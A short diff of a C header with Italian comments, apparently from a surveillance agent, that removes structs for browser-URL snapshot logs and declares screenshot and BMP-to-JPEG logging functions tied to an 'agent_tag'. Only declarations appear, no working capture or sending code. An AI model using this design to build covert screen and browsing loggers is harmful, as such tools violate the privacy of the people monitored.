@@ -42,21 +42,9 @@ typedef struct _SnapshotAdditionalData {
 	UINT uWindowNameLen;
 } SnapshotAdditionalData;
 
-// XXX Additional data per i log di tipo URL con snapshot
-typedef struct _UrlSnapAdditionalData {
-	UINT uVersion;
-		#define LOG_URLSNAP_VERSION 2010071301
-	UINT uBrowserType;
-	UINT uUrlNameLen;
-	UINT uWindowTitleLen;
-} UrlSnapAdditionalData;
-
-typedef struct _url_info_struct {
-	UINT uBrowserType;
-	WCHAR url_name[1];
-} url_info_struct;
-
-
 // Dichiarata in HM_SnapShot.h in cui questo file viene incluso
 extern void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);
 extern void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD g_xscdim, DWORD g_yscdim);
+
+// In BitmapCommon
+extern void BmpToJpgLog(DWORD agent_tag, BYTE* additional_header, DWORD additional_len, BITMAPINFOHEADER* pBMI, size_t cbBMI, BYTE* pData, size_t cbData, DWORD quality);
